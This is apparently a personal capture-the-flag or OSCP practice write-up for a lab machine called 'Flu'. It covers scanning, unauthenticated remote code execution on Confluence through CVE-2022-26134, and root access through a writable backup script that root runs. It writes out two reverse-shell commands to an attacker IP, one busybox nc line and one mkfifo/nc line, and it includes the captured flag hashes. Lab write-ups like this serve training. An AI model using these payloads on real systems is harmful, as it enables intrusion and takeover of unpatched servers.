---
title: Flu
date: 2025-11-18
---
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 8090
- [ ] 8091
- [ ] 22

# Service Enumeration
## 8090
![[Pasted image 20251118070243.png]]

Powered by Atlassian Confluence 7.13.6

https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html

https://github.com/nxtexploit/CVE-2022-26134
This exploit works immediately for unauthenticated remote code execution.

![[Pasted image 20251118071051.png]]
# Initial Access
Start listener on port 4444:
`penelope`

Use poc exploit (https://github.com/nxtexploit/CVE-2022-26134) to establish reverse shell:
`python3 CVE-2022-26134.py http://192.168.231.41:8090 "busybox nc 192.168.45.170 4444 -e /bin/bash"`

![[Pasted image 20251118071320.png]]

# Privilege Escalation

From pspy, we see that root automatically runs /opt/log-backup.sh, which is a file we own and can modify.
![[Pasted image 20251118071814.png]]

![[Pasted image 20251118072736.png]]

log-backup.sh
```
#!/bin/bash

CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

# Create a backup of log files
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP

tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP

# Cleanup old backups
find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;

```

Modify to include a reverse shell payload at the top:
```
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.170 4444 >/tmp/f

CONFLUENCE_HOME="/opt/atlassian/confluence/"
...
```

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

cat /home/confluence/local.txt
f3e3366eb8c0cfe2e15c364d2fcfb000

![[Pasted image 20251118072518.png]]

cat /root/proof.txt
df354b5d8de8ab4ec1b44cd6f464e779
![[Pasted image 20251118072538.png]]
